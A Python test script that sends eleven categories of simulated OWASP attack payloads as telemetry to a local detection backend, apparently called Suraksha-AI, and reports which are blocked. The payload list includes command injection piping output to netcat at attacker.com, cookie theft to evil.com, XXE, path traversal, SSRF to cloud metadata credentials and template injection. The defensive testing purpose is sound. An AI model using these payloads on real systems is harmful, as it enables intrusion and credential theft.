"""
Suraksha-AI Live Attack Simulation Script
==========================================
Sends live simulated requests across all 11 OWASP attack vectors to the Suraksha-AI backend.
Watch the Live Monitoring & Attack Logs dashboard in your browser in real-time!

Usage:
    Backend\\venv\\Scripts\\python.exe test_live_attacks.py --host http://127.0.0.1:5000 --delay 1.0
"""

import time
import json
import random
import argparse
import urllib.request
import urllib.error

ATTACK_SIMULATIONS = [
    {
        "category": "Broken Access Control",
        "url": "/api/users/profile",
        "method": "POST",
        "payload": {"user_id": "1", "role": "admin", "isAdmin": "true"},
        "client_ip": "198.51.100.42"
    },
    {
        "category": "XML / XXE Injection",
        "url": "/api/xml/upload",
        "method": "POST",
        "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "client_ip": "203.0.113.15"
    },
    {
        "category": "Command Injection",
        "url": "/api/tools/ping",
        "method": "POST",
        "payload": "127.0.0.1; whoami && id | nc attacker.com 4444",
        "client_ip": "185.220.101.5"
    },
    {
        "category": "Cross-Site Scripting (XSS)",
        "url": "/api/comments/new",
        "method": "POST",
        "payload": "<script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
        "client_ip": "192.0.2.88"
    },
    {
        "category": "Path Traversal",
        "url": "/api/files/download",
        "method": "GET",
        "payload": "../../../../etc/shadow",
        "client_ip": "198.51.100.99"
    },
    {
        "category": "SSRF",
        "url": "/api/fetch/url",
        "method": "POST",
        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "client_ip": "203.0.113.77"
    },
    {
        "category": "LDAP Injection",
        "url": "/api/directory/search",
        "method": "POST",
        "payload": "*)(&(objectClass=*))",
        "client_ip": "185.220.101.23"
    },
    {
        "category": "Header Injection",
        "url": "/api/auth/set-preference",
        "method": "POST",
        "payload": "user_pref\r\nSet-Cookie: session=hijacked; Domain=.target.com",
        "client_ip": "192.0.2.14"
    },
    {
        "category": "Template Injection (SSTI)",
        "url": "/api/render/template",
        "method": "POST",
        "payload": "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
        "client_ip": "198.51.100.12"
    },
    {
        "category": "Open Redirect",
        "url": "/api/auth/login",
        "method": "GET",
        "payload": "redirect=https://evil-phishing-portal.com/login",
        "client_ip": "203.0.113.4"
    },
    {
        "category": "SQL Injection",
        "url": "/api/target/login",
        "method": "POST",
        "payload": "admin' OR 1=1 --",
        "client_ip": "185.220.101.99"
    },
    {
        "category": "Legitimate Traffic (Safe)",
        "url": "/api/products/search",
        "method": "POST",
        "payload": "cybersecurity ai protection firewall",
        "client_ip": "127.0.0.1"
    }
]

def send_telemetry(host, item):
    endpoint = f"{host.rstrip('/')}/api/target/telemetry"
    
    post_data = {
        "source_app": f"Live Web App ({item['category']})",
        "url": item["url"],
        "method": item["method"],
        "payload": item["payload"],
        "client_ip": item["client_ip"],
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"
    }

    req = urllib.request.Request(
        endpoint,
        data=json.dumps(post_data).encode('utf-8'),
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=5.0) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            return resp.status, data
    except urllib.error.HTTPError as e:
        try:
            err_data = json.loads(e.read().decode('utf-8'))
            return e.code, err_data
        except Exception:
            return e.code, {"message": str(e)}
    except Exception as e:
        return 0, {"error": str(e)}

def run_simulation(host="http://127.0.0.1:5000", delay=1.0):
    print("=" * 75)
    print(f" 🚀 LAUNCHING SURAKSHA-AI LIVE MULTI-THREAT TEST SIMULATION")
    print(f" Target Gateway : {host}")
    print(f" Delay Interval : {delay}s per attack")
    print("=" * 75)

    for idx, item in enumerate(ATTACK_SIMULATIONS, 1):
        status_code, resp_data = send_telemetry(host, item)
        data = resp_data.get('data', {})
        blocked = data.get('blocked', False)
        verdict = data.get('verdict', 'ALLOWED' if status_code == 200 else 'BLOCKED')
        threat_cat = data.get('attack_category', item['category'])
        threat_level = data.get('threat_level', 'Info')

        if blocked or status_code == 403:
            badge = "[403 BLOCKED 🛡️]"
        elif status_code == 200:
            badge = "[200 ALLOWED ✅]"
        else:
            badge = f"[{status_code} ERROR   ⚠️]"

        print(f"[{idx:02d}/{len(ATTACK_SIMULATIONS):02d}] {badge} {item['category']:<26} -> {verdict:<8} | Severity: {threat_level:<8} | IP: {item['client_ip']}")
        time.sleep(delay)

    print("=" * 75)
    print(" ✅ LIVE SIMULATION FINISHED!")
    print(" Open the Suraksha-AI dashboard at http://localhost:5173 to view:")
    print("  • Attack Logs Table")
    print("  • Live Monitoring Stream")
    print("  • Multi-Threat Radar Analytics")
    print("=" * 75)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Suraksha-AI Live Multi-Threat Simulation")
    parser.add_argument('--host', type=str, default='http://127.0.0.1:5000', help="Suraksha backend URL")
    parser.add_argument('--delay', type=float, default=1.0, help="Delay between attacks in seconds")
    args = parser.parse_args()

    run_simulation(host=args.host, delay=args.delay)
